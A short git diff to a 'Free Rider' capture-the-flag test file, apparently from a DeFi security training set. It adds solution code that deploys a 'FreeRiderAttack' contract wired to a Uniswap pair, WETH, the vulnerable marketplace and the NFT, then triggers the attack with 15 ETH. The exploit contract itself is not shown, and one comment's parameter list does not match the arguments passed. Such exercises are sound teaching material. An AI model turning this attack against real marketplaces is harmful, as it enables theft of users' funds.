@@ -90,7 +90,7 @@ describe('[Challenge] Free Rider', function () {
         await nft.setApprovalForAll(marketplace.address, true);
 
         // Open offers in the marketplace
-        await marketplace.offerMany(
+        await marketplace.offerMany( 
             [0, 1, 2, 3, 4, 5],
             [NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE]
         );
@@ -106,6 +106,13 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+// _recoveryAddress ,  _player  ,  _uniswapPair ,  _weth ,   _marketPlace
+const attacker = await (await ethers.getContractFactory('FreeRiderAttack', deployer)).deploy(
+    devsContract.address  , uniswapPair.address , weth.address , marketplace.address,
+    nft.address , player.address
+);
+await attacker.connect(player).attack(ethers.utils.parseEther('15'));
+
     });
 
     after(async function () {
